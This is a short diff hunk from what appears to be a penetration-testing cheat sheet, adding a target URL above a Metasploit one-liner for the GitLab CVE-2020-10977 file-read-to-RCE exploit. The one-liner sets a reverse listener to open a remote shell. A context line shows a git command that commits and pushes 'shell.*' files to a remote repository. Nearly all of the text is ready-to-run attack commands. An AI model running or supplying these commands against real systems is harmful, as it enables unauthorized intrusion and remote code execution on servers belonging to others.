@@ -278,6 +278,7 @@ git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f
 
 +---------- Gitlab ----------+
 -->> CVE-2020-10977 (GitLab CE/EE 8.5 to 12.9)
+http://$TARGET/help
 msfconsole -q -x 'use exploit/multi/http/gitlab_file_read_rce; set VHOST git.$DOM; set SSL true; set RHOSTS $TARGET; set RPORT 443; set USERNAME test; set PASSWORD testtest; set LHOST tun0; set LPORT 8787; set ForceExploit true; run'
 
 -->> Running Ports
